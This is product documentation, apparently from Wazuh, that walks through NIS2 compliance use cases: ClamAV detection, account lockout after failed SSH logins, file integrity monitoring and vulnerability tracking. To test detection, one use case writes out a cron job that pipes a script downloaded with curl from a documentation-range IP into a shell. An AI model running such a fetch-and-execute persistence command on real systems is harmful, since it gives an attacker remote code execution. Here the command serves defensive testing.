.. Copyright (C) 2015, Wazuh, Inc.

.. meta::
   :description: Learn how Wazuh helps you meet the requirements of the NIS2 Directive and Commission Implementing Regulation (EU) 2024/2690 with use cases for risk management and incident reporting.

Using Wazuh for NIS2 compliance
===============================

The NIS2 Directive, Directive (EU) 2022/2555, sets a common cybersecurity level for essential and important entities in the European Union. Article 21 requires these entities to take technical, operational, and organizational measures to manage the risks to their network and information systems. Article 23 requires them to report significant incidents to their computer security incident response team (CSIRT) or competent authority within fixed deadlines.

This document outlines use cases that show how Wazuh helps you meet the requirements of the NIS2 Directive and of Commission Implementing Regulation (EU) 2024/2690.

.. note::

   These rules and mappings are indicative and do not by themselves certify compliance. See :doc:`Regulatory compliance </compliance/index>` for more details.

NIS2 cybersecurity risk-management measures
-------------------------------------------

Article 21(2) lists the minimum measures:

-  Point (a): policies on risk analysis and information system security
-  Point (b): incident handling
-  Point (c): business continuity, such as backup management and disaster recovery, and crisis management
-  Point (d): supply chain security, including security-related aspects concerning the relationships between each entity and its direct suppliers or service providers
-  Point (e): security in network and information systems acquisition, development and maintenance, including vulnerability handling and disclosure
-  Point (f): policies and procedures to assess the effectiveness of cybersecurity risk-management measures
-  Point (g): basic cyber hygiene practices and cybersecurity training
-  Point (h): policies and procedures regarding the use of cryptography and, where appropriate, encryption
-  Point (i): human resources security, access control policies and asset management
-  Point (j): the use of multi-factor authentication or continuous authentication solutions, secured voice, video and text communications and secured emergency communication systems within the entity, where appropriate

.. _nis2_reporting_obligations:

Reporting obligations and the Implementing Regulation
-----------------------------------------------------

Article 23 requires entities to notify their CSIRT or competent authority of any significant incident: an early warning within 24 hours, an incident notification within 72 hours, and a final report within one month of the incident notification.

Commission Implementing Regulation (EU) 2024/2690 sets out the technical and methodological requirements for these measures. It applies to entities such as DNS service providers, cloud computing service providers, and managed security service providers. Its annex is organized into numbered sections; for example, section 3.2 covers monitoring and logging.

The Wazuh NIS2 dashboard
------------------------

To view the NIS2 data on the Wazuh dashboard:

#. Open the menu (☰), go to **Security operations** > **Regulatory Compliance**, and click the **NIS2** tab. The **Dashboard** tab shows an overview of the NIS2 requirements in your environment, the top agents, and the requirements over time.

   .. thumbnail:: /images/compliance/nis2/nis2-dashboard.png
      :title: NIS2 dashboard
      :alt: NIS2 dashboard
      :align: center
      :width: 80%

#. Switch to the **Controls** tab to see how many findings map to each NIS2 requirement in the selected time range. Turn on **Hide requirements with no findings** to list only the requirements that have findings.

   .. thumbnail:: /images/compliance/nis2/nis2-controls.png
      :title: NIS2 controls
      :alt: NIS2 controls
      :align: center
      :width: 80%

#. Switch to the **Findings** tab to see the individual findings mapped to NIS2 requirements, regardless of their log source. The **Requirements** column shows the requirements of each finding.

   .. thumbnail:: /images/compliance/nis2/nis2-findings.png
      :title: NIS2 findings
      :alt: NIS2 findings
      :align: center
      :width: 80%

The **Others** entry groups the findings mapped to the sections of Implementing Regulation (EU) 2024/2690, such as ``IR-3.2``.

The dashboard also supports Article 21(2), point (f). It shows which measures generate findings and how their number changes over time.

Wazuh rules and Security Configuration Assessment (SCA) policies map findings to NIS2 requirements. Identifiers such as ``21.2.b`` refer to Article 21(2), point (b). The identifier ``23`` refers to Article 23. Identifiers that start with ``IR-``, such as ``IR-3.2``, refer to the sections of the annex to Implementing Regulation (EU) 2024/2690. You can also map custom rules to NIS2 requirements. In Wazuh 5.0, rules use the Sigma format. To map a custom rule, add the identifiers to the ``nis2`` list under the ``compliance`` field of the rule. For example:

.. code-block:: yaml

   compliance:
     nis2:
       - 21.2.b
       - 23

Refer to the :doc:`Rules </user-manual/data-analysis/rules>` section for more information. To create a custom rule and put it into production, see :ref:`Create a custom rule <data_analysis_create_custom_rule>`.

Article 21: Cybersecurity risk-management measures
--------------------------------------------------

Article 21(2), point (a): Policies on risk analysis and information system security
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Risk analysis depends on current information about the threats and vulnerabilities affecting your network and information systems.

Wazuh helps meet point (a) with Wazuh Cyber Threat Intelligence (CTI), which keeps the rules, indicators of compromise (IOCs), and vulnerability records of your environment up to date. The CTI Feed page shows when each feed last synced.

Use case: Confirming that threat intelligence feeds are up to date
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This use case shows how to check that Wazuh CTI feeds are current, so you can show that your detection relies on current data.

Wazuh dashboard
"""""""""""""""

#. Open the menu (☰) and go to **Threat intelligence** > **CTI Feed**.

#. In **Feed sync**, check that each feed shows **Up to date**. The feeds are the Ruleset, the Indicators of Compromise, and the Vulnerabilities. Click **Check for updates** to sync the feeds now.

   .. thumbnail:: /images/compliance/nis2/cti-feed-sync.png
      :title: CTI feed sync
      :alt: CTI feed sync
      :align: center
      :width: 80%

#. Scroll down to **Feed content** to see how many rules, decoders, integrations, KVDBs, IOCs, and CVE records the feed delivered to your environment.

   .. thumbnail:: /images/compliance/nis2/cti-feed-content.png
      :title: CTI feed content
      :alt: CTI feed content
      :align: center
      :width: 80%

Article 21(2), point (b): Incident handling
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Wazuh helps meet point (b) by turning endpoint detections, including antivirus engine detections, into findings. Active responses contain attacks by running scripts on endpoints.

Use case: Detecting malware with ClamAV
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This use case shows how Wazuh generates findings from the detections of ClamAV, an open source antivirus engine, on an Ubuntu 24.04 endpoint. ClamAV scans a file of the ``clamav-testfiles`` package. The ClamAV project provides these harmless files to test detection.

Wazuh dashboard
"""""""""""""""

#. Open the menu (☰) and go to **Ruleset management** > **Overview**, and select the **Standard** space. Search for ``clamav`` in the **Integrations** table and click the integration title. Then click **Actions** and select **Enable**. The ``clamav`` integration decodes the ClamAV logs, and it's disabled by default.

Ubuntu endpoint
"""""""""""""""

#. Install ClamAV and its test files on the Ubuntu 24.04 endpoint:

   .. code-block:: console

      $ sudo apt-get update
      $ sudo apt-get install -y clamav clamav-daemon clamav-testfiles

   On a new installation, wait until ``freshclam`` downloads the signature databases. The ClamAV daemon doesn't start without them.

#. Edit the ``/etc/clamav/clamd.conf`` file and set ``LogSyslog`` to ``true``, so that the ClamAV daemon writes its detections to the system journal. The Wazuh agent reads the system journal by default.

   .. code-block:: ini

      LogSyslog true

#. Restart the ClamAV daemon to apply the change:

   .. code-block:: console

      $ sudo systemctl restart clamav-daemon

#. Scan a test file:

   .. code-block:: console

      $ sudo clamdscan --fdpass /usr/share/clamav-testfiles/clam.exe

   The command output looks similar to this:

   .. code-block:: none
      :class: output

      /usr/share/clamav-testfiles/clam.exe: Clamav.Test.File-6 FOUND

Wazuh dashboard
"""""""""""""""

#. Open the menu (☰) and go to **Threat intelligence** > **Threat Hunting**, switch to the **Findings** tab, and enter the following query:

   .. code-block:: none

      wazuh.integration.name:clamav and wazuh.rule.title:"Malware file detected - /usr/share/clamav-testfiles/clam.exe"

   .. thumbnail:: /images/compliance/nis2/clamav-findings-query.png
      :title: ClamAV findings
      :alt: ClamAV findings
      :align: center
      :width: 80%

#. Expand the finding. The ``event.original`` field shows the ClamAV detection, and the ``file.path`` field shows the detected file.

   .. thumbnail:: /images/compliance/nis2/clamav-finding-details.png
      :title: ClamAV finding details
      :alt: ClamAV finding details
      :align: center
      :width: 80%

#. Scroll down to the ``wazuh.rule.compliance.nis2`` field. The finding maps to ``IR-6.9``.

   .. thumbnail:: /images/compliance/nis2/clamav-finding-nis2.png
      :title: ClamAV finding NIS2 mapping
      :alt: ClamAV finding NIS2 mapping
      :align: center
      :width: 80%

Use case: Locking a local account under a password-guessing attack
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This use case shows how Wazuh locks a local account on a monitored Ubuntu 24.04 endpoint when someone tries to guess its password. Each failed login generates a ``Failed authentication attempt - <USERNAME>`` finding, which maps to ``IR-3.2``. The ``disable-account`` active response locks the password of the account in the ``user.name`` field of the finding. You need a second endpoint with SSH access to the Ubuntu endpoint to simulate the attack.

.. note::

   The ``disable-account`` active response locks the account of each matching finding, for any account on any Linux or macOS endpoint. Test this use case with a dedicated account in a test environment, and delete the monitor when you finish.

Ubuntu endpoint
"""""""""""""""

#. Create a test account named ``contractor02`` and set a password for it:

   .. code-block:: console

      $ sudo useradd -m -s /bin/bash contractor02
      $ sudo passwd contractor02

Wazuh dashboard
"""""""""""""""

#. Open the menu (☰) and go to **Explore** > **Active Responses**.

#. Click **Create active response** and enter the following details. The ``disable-account`` executable is an out-of-the-box script that exists on Linux and macOS Wazuh agents. The **Local** location runs the script on the endpoint that generated the finding. The **Stateless** type runs the script once and never reverts its action.

   +----------------+------------------------+
   | **Field**      | **Value**              |
   +================+========================+
   | **Name**       | ``account_lockout_ar`` |
   +----------------+------------------------+
   | **Executable** | ``disable-account``    |
   +----------------+------------------------+
   | **Type**       | Stateless              |
   +----------------+------------------------+
   | **Location**   | Local                  |
   +----------------+------------------------+

   .. thumbnail:: /images/compliance/nis2/create-active-response.png
      :title: Create active response
      :alt: Create active response
      :align: center
      :width: 80%

#. Click **Create** to save the active response.

#. Go to **Explore** > **Alerting**, switch to the **Monitors** tab, and then click **Create monitor**.

#. Fill in the following parameters. The **Active Response monitor** type runs the active response that you select in the **Actions** subsection when a finding matches the query. This filter selects failed login findings, such as those of the ``Failed authentication attempt - <USERNAME>`` rule. Don't filter on ``wazuh.rule.id``: rule IDs change when the Wazuh CTI ruleset is updated.

   +-----------------------------+---------------------------------------+
   | **Field**                   | **Value**                             |
   +=============================+=======================================+
   | **Monitor name**            | ``account_lockout_ar_monitor``        |
   +-----------------------------+---------------------------------------+
   | **Monitor type**            | Active Response monitor               |
   +-----------------------------+---------------------------------------+
   | **Monitor defining method** | Visual editor                         |
   +-----------------------------+---------------------------------------+
   | **Frequency**               | By interval                           |
   +-----------------------------+---------------------------------------+
   | **Run every**               | 1 Minute(s)                           |
   +-----------------------------+---------------------------------------+
   | **Index**                   | ``wazuh-findings-v5-system-activity`` |
   +-----------------------------+---------------------------------------+
   | **Query name**              | ``account_lockout_ar_query``          |
   +-----------------------------+---------------------------------------+
   | **Field**                   | ``event.action``                      |
   +-----------------------------+---------------------------------------+
   | **Operator**                | is                                    |
   +-----------------------------+---------------------------------------+
   | **Value**                   | ``authentication-failure``            |
   +-----------------------------+---------------------------------------+

   .. thumbnail:: /images/compliance/nis2/create-active-response-monitor.png
      :title: Create an Active Response monitor
      :alt: Create an Active Response monitor
      :align: center
      :width: 80%

#. In the **Triggers** section, click **Add trigger** and fill in the following parameters.

   +-----------------------------+--------------------------------+
   | **Field**                   | **Value**                      |
   +=============================+================================+
   | **Trigger name**            | ``account_lockout_ar_trigger`` |
   +-----------------------------+--------------------------------+
   | **Severity level**          | 1 (Highest)                    |
   +-----------------------------+--------------------------------+
   | **Specify queries or tags** | ``account_lockout_ar_query``   |
   +-----------------------------+--------------------------------+

#. In the **Actions** subsection, click **Add active response** and fill in the following parameters.

   +---------------------+-------------------------------+
   | **Field**           | **Value**                     |
   +=====================+===============================+
   | **Action name**     | ``account_lockout_ar_action`` |
   +---------------------+-------------------------------+
   | **Active response** | ``account_lockout_ar``        |
   +---------------------+-------------------------------+

   .. thumbnail:: /images/compliance/nis2/create-active-response-monitor-action.png
      :title: Create an Active Response monitor action
      :alt: Create an Active Response monitor action
      :align: center
      :width: 80%

#. Click **Create** to save the monitor.

Attacker endpoint
"""""""""""""""""

#. Replace ``<UBUNTU_IP_ADDRESS>`` with the IP address of the Ubuntu endpoint and run the following command on the attacker endpoint. Enter a wrong password at each of the three prompts:

   .. code-block:: console

      $ ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no contractor02@<UBUNTU_IP_ADDRESS>

#. Wait three minutes, then run the following command on the Ubuntu endpoint to check the status of the account:

   .. code-block:: console

      $ sudo passwd -S contractor02

   Output:

   .. code-block:: none
      :class: output

      contractor02 L 2026-11-20 0 99999 7 -1

   The ``L`` in the second field means that the password of the account is locked, so nobody can log in to the account with its password.

Wazuh dashboard
"""""""""""""""

#. Open the menu (☰) and go to **Threat intelligence** > **Threat Hunting**, then switch to the **Findings** tab. Enter the following query in the search bar to see all the findings for the account, including the failed logins:

   .. code-block:: none

      user.name:contractor02

   .. thumbnail:: /images/compliance/nis2/account-lockout-findings.png
      :title: Findings for the locked account
      :alt: Findings for the locked account
      :align: center
      :width: 80%

#. Go to **Security operations** > **Incident Response** and switch to the **Responses** tab, and enter ``wazuh.active_response.name:account_lockout_ar`` in the search bar. Each row shows a run of the ``account_lockout_ar`` active response with the ``disable-account`` executable on the Ubuntu endpoint.

   .. thumbnail:: /images/compliance/nis2/account-lockout-responses.png
      :title: Active response runs
      :alt: Active response runs
      :align: center
      :width: 80%

After you finish this use case, delete the ``account_lockout_ar_monitor`` monitor in **Explore** > **Alerting** and the ``account_lockout_ar`` active response in **Explore** > **Active Responses**. Then unlock the account on the Ubuntu endpoint with the following command, or delete it with ``sudo userdel -r contractor02``:

.. code-block:: console

   $ sudo passwd -u contractor02

Article 21(2), point (e): Security in network and information systems acquisition, development and maintenance
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Wazuh helps meet point (e) with the File Integrity Monitoring (FIM) and Vulnerability Detection modules, as well as Wazuh CTI vulnerability records.

Use case: Detecting new scheduled jobs in /etc/cron.d
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This use case shows how to monitor the ``/etc/cron.d`` directory of an Ubuntu 24.04 endpoint in real time. Attackers add files to this directory to run their tools on a schedule.

Ubuntu endpoint
"""""""""""""""

#. Add the following configuration to the ``<syscheck>`` block of the Wazuh agent configuration file ``/var/ossec/etc/ossec.conf``:

   .. code-block:: xml

      <directories report_changes="yes" realtime="yes">/etc/cron.d</directories>

#. Restart the Wazuh agent to apply the changes:

   .. code-block:: console

      $ sudo systemctl restart wazuh-agent

#. Create a cron job that downloads and runs a script every 30 minutes:

   .. code-block:: console

      $ echo "*/30 * * * * root /usr/bin/curl -s http://198.51.100.24/sync.sh | /bin/sh" | sudo tee /etc/cron.d/backup-sync

   The IP address 198.51.100.24 belongs to a range reserved for documentation, so the job doesn't download anything.

Wazuh dashboard
"""""""""""""""

#. Open the menu (☰), go to **Endpoint security** > **File Integrity Monitoring**, switch to the **Findings** tab, and enter the following query:

   .. code-block:: none

      file.path:"/etc/cron.d/backup-sync"

   .. thumbnail:: /images/compliance/nis2/fim-cron-findings.png
      :title: FIM findings for the cron job
      :alt: FIM findings for the cron job
      :align: center
      :width: 80%

#. Expand the ``Wazuh FIM - File created`` finding. The finding shows the new file's owner, permissions, and hashes.

   .. thumbnail:: /images/compliance/nis2/fim-cron-finding-details.png
      :title: FIM finding details
      :alt: FIM finding details
      :align: center
      :width: 80%

#. Scroll down to the ``wazuh.rule.compliance.nis2`` field. The finding maps to ``21.2.a``, ``21.2.e``, and ``23``.

   .. thumbnail:: /images/compliance/nis2/fim-cron-finding-nis2.png
      :title: FIM finding NIS2 mapping
      :alt: FIM finding NIS2 mapping
      :align: center
      :width: 80%

After you finish this use case, remove the test cron job on the Ubuntu endpoint:

.. code-block:: console

   $ sudo rm /etc/cron.d/backup-sync

Use case: Detecting a new service on a Windows endpoint
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This use case shows how Wazuh detects a new service on a Windows 11 endpoint. Malware and unauthorized software often install a service so that they start with the system.

Windows endpoint
""""""""""""""""

#. Run the following command in PowerShell as an administrator to create a service named RemoteSupportAgent:

   .. code-block:: ps1con

      > sc.exe create RemoteSupportAgent binPath= "C:\Windows\System32\notepad.exe" start= demand DisplayName= "Remote Support Agent"

Wazuh dashboard
"""""""""""""""

#. Open the menu (☰) and go to **Threat intelligence** > **Threat Hunting**, click **Explore agent**, and select the Windows endpoint. Then switch to the **Findings** tab and enter the following query:

   .. code-block:: none

      wazuh.rule.title:"System service installed - Remote Support Agent"

   One finding matches. It comes from the Windows System event log, which records event ID 7045 when a service is installed.

   .. thumbnail:: /images/compliance/nis2/windows-service-findings-query.png
      :title: Findings for the new Windows service
      :alt: Findings for the new Windows service
      :align: center
      :width: 80%

#. Expand the finding. The ``service.name`` and ``process.executable`` fields describe the new service, and ``event.code`` shows the Windows event ID.

   .. thumbnail:: /images/compliance/nis2/windows-service-finding-details.png
      :title: Windows service finding details
      :alt: Windows service finding details
      :align: center
      :width: 80%

#. Scroll down to the ``wazuh.rule.compliance.nis2`` field. The finding maps to ``21.2.a``, ``21.2.e``, and ``23``.

   .. thumbnail:: /images/compliance/nis2/windows-service-finding-nis2.png
      :title: Windows service finding NIS2 mapping
      :alt: Windows service finding NIS2 mapping
      :align: center
      :width: 80%

After you finish this use case, delete the test service on the Windows endpoint:

.. code-block:: ps1con

   > sc.exe delete RemoteSupportAgent

Use case: Tracking the remediation of vulnerabilities
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This use case shows how Wazuh records each vulnerability that you remediate. You remove an old Linux kernel from an Ubuntu 24.04 endpoint. Ubuntu keeps the previous kernel after a kernel upgrade, and its vulnerabilities stay on the endpoint until you remove it.

Ubuntu endpoint
"""""""""""""""

#. Check the running kernel and the installed kernel packages on the Ubuntu endpoint:

   .. code-block:: console

      $ uname -r
      $ dpkg -l 'linux-image-*' | grep ^ii

   Don't remove the kernel that ``uname -r`` shows. If the endpoint has only one kernel, remove another vulnerable package that you don't need instead. The **Inventory** tab of **Vulnerability Detection** lists the vulnerable packages.

#. Remove the packages of the old kernel:

   .. code-block:: console

      $ sudo apt-get purge -y linux-image-<OLD_KERNEL_VERSION> linux-modules-<OLD_KERNEL_VERSION> linux-headers-<OLD_KERNEL_VERSION>

   Replace ``<OLD_KERNEL_VERSION>`` with the version of the old kernel, for example, ``7.0.0-42-generic``.

#. Restart the Wazuh agent to run a new inventory scan:

   .. code-block:: console

      $ sudo systemctl restart wazuh-agent

   Wazuh marks the vulnerabilities of the removed packages as remediated within a few minutes.

Wazuh dashboard
"""""""""""""""

#. Open the menu (☰), go to **Threat intelligence** > **Vulnerability Detection**, click **Explore agent**, and select the Ubuntu endpoint. Then switch to the **Findings** tab and enter the following query:

   .. code-block:: none

      wazuh.rule.title:*remediated* and package.name:linux-image-<OLD_KERNEL_VERSION>

   Wazuh generates a ``Vulnerability <CVE_ID> remediated`` finding for each vulnerability of the removed package. If you removed another package, use its name in the query.

   .. thumbnail:: /images/compliance/nis2/remediated-vulnerability-findings.png
      :title: Remediated vulnerability findings
      :alt: Remediated vulnerability findings
      :align: center
      :width: 80%

#. Expand a finding and scroll down to the ``wazuh.rule.compliance.nis2`` field. The finding maps to ``21.2.a`` and ``21.2.e``.

   .. thumbnail:: /images/compliance/nis2/remediated-vulnerability-nis2.png
      :title: Remediated vulnerability finding NIS2 mapping
      :alt: Remediated vulnerability finding NIS2 mapping
      :align: center
      :width: 80%

Use case: Assessing a vulnerability with Wazuh CTI
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This use case shows how to look up a CVE in the CTI Explorer when you assess a new advisory.

Wazuh dashboard
"""""""""""""""

#. Open the menu (☰) and go to **Threat intelligence** > **CTI Explorer**.

#. Enter a CVE identifier in the search bar and click **Check**. For example, enter ``CVE-2026-76312``. The result shows the CVSS score, the publication date, and the assigner of the record.

   .. thumbnail:: /images/compliance/nis2/cti-explorer-search.png
      :title: CTI Explorer search
      :alt: CTI Explorer search
      :align: center
      :width: 80%

#. Click **Open the record**. The details include the description, affected products, scores, and vulnerability references. Click **Vulnerability Detection** in the record to see which of your endpoints the CVE affects.

   .. thumbnail:: /images/compliance/nis2/cti-explorer-record.png
      :title: CTI Explorer record
      :alt: CTI Explorer record
      :align: center
      :width: 80%

Article 21(2), point (i): Human resources security, access control policies and asset management
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Wazuh helps meet point (i) with the Security Configuration Assessment (SCA) module, which checks the access control settings of your endpoints against the Center for Internet Security (CIS) benchmarks.

Use case: Restricting scheduled jobs to authorized users
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This use case shows how to find and fix the failed CIS Ubuntu Linux 24.04 LTS Benchmark check 35600, **Ensure crontab is restricted to authorized users.**, on an Ubuntu 24.04 endpoint. The check fails when the ``/etc/cron.allow`` file doesn't exist or has insecure permissions.

Wazuh dashboard
"""""""""""""""

#. Open the menu (☰) and go to **Endpoint security** > **Configuration Assessment**.

#. Click **Explore agent**, select the Ubuntu endpoint, and switch to the **Inventory** tab.

#. In **Check**, search for and select **Ensure crontab is restricted to authorized users.** The **check.result** column shows **Failed**.

   .. thumbnail:: /images/compliance/nis2/sca-check-failed.png
      :title: SCA check failed
      :alt: SCA check failed
      :align: center
      :width: 80%

#. Click the inspect icon of the check to open its details. The ``check.compliance.nis2`` field shows ``21.2.g``, ``21.2.j``, and ``21.2.i``.

   .. thumbnail:: /images/compliance/nis2/sca-check-details.png
      :title: SCA check details
      :alt: SCA check details
      :align: center
      :width: 80%

Ubuntu endpoint
"""""""""""""""

#. Run the following commands on the Ubuntu endpoint to create the ``/etc/cron.allow`` file with secure ownership and permissions:

   .. code-block:: console

      $ sudo touch /etc/cron.allow
      $ sudo chown root:root /etc/cron.allow
      $ sudo chmod 640 /etc/cron.allow

   With an empty ``/etc/cron.allow`` file, only the root user can use ``crontab``. Add one user name per line to allow other users.

#. Restart the Wazuh agent to run a new SCA scan:

   .. code-block:: console

      $ sudo systemctl restart wazuh-agent

Wazuh dashboard
"""""""""""""""

#. In **Configuration Assessment**, switch to the **Findings** tab and enter the following query:

   .. code-block:: none

      wazuh.rule.title:"Wazuh SCA check passed - Ensure crontab is restricted to authorized users."

   The finding shows that check 35600 now passes.

   .. thumbnail:: /images/compliance/nis2/sca-check-passed.png
      :title: SCA check passed
      :alt: SCA check passed
      :align: center
      :width: 80%

Article 23: Reporting obligations
---------------------------------

Early warning and incident notification
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Article 23(4) requires an early warning and an incident notification for each significant incident, within the deadlines described in :ref:`Reporting obligations and the Implementing Regulation <nis2_reporting_obligations>`. The incident notification includes an initial assessment of the incident, its severity and impact, and, where available, the indicators of compromise.

Wazuh helps meet Article 23 by exporting incident findings to a CSV file from the Wazuh dashboard.

Use case: Exporting the findings of an incident for an early warning
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This use case shows how to export the high and critical findings of an Ubuntu endpoint for the last hour.

Wazuh dashboard
"""""""""""""""

#. Open the menu (☰) and go to **Threat intelligence** > **Threat Hunting**, click **Explore agent**, and select the endpoint. Then switch to the **Findings** tab.

#. Set the time picker to the period of the incident, for example **Last 1 hour**, and enter the following query to keep the high and critical findings:

   .. code-block:: none

      wazuh.rule.level:(high or critical)

   .. thumbnail:: /images/compliance/nis2/export-findings-query.png
      :title: Findings query for the export
      :alt: Findings query for the export
      :align: center
      :width: 80%

#. Click **Export Formatted**. The Wazuh dashboard downloads a CSV file with the findings and confirms the number of exported rows.

   .. thumbnail:: /images/compliance/nis2/export-findings-csv.png
      :title: Export formatted findings
      :alt: Export formatted findings
      :align: center
      :width: 80%

Use the CSV file to describe the affected endpoint, the timeline, and the detected techniques in your report.

Implementing Regulation (EU) 2024/2690
--------------------------------------

Section 11.5: Identification
^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Section 11.5 of the annex to Implementing Regulation (EU) 2024/2690 requires the relevant entities to manage the full life cycle of the identities of their network and information systems and of their users.

Unexpected local accounts can indicate persistence after a compromise, so new accounts must be visible as soon as they appear.

Use case: Detecting new local user accounts
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

This use case shows how Wazuh detects a new local account on an Ubuntu 24.04 endpoint.

Ubuntu endpoint
"""""""""""""""

#. Create a local user on the Ubuntu endpoint:

   .. code-block:: console

      $ sudo useradd -m -s /bin/bash -c "Contractor account" contractor01

Wazuh dashboard
"""""""""""""""

#. Open the menu (☰) and go to **Threat intelligence** > **Threat Hunting**, switch to the **Findings** tab, and enter the following query:

   .. code-block:: none

      wazuh.rule.title:"New user account created" and user.target.name:contractor01

   One finding matches. It comes from the authentication log (``system-auth``), and the ``user.target.name`` field holds the name of the new account.

   .. thumbnail:: /images/compliance/nis2/new-user-findings-query.png
      :title: Findings for the new user account
      :alt: Findings for the new user account
      :align: center
      :width: 80%

#. Expand the finding. The ``event.original`` field shows the ``useradd`` log line with the username, user ID, home directory, and shell.

   .. thumbnail:: /images/compliance/nis2/new-user-finding-details.png
      :title: New user account finding details
      :alt: New user account finding details
      :align: center
      :width: 80%

#. Scroll down to the ``wazuh.rule.compliance.nis2`` field. The finding maps to ``IR-11.5`` and ``IR-3.2``.

   .. thumbnail:: /images/compliance/nis2/new-user-finding-nis2.png
      :title: New user account finding NIS2 mapping
      :alt: New user account finding NIS2 mapping
      :align: center
      :width: 80%

After you finish this use case, delete the test user on the Ubuntu endpoint:

.. code-block:: console

   $ sudo userdel -r contractor01
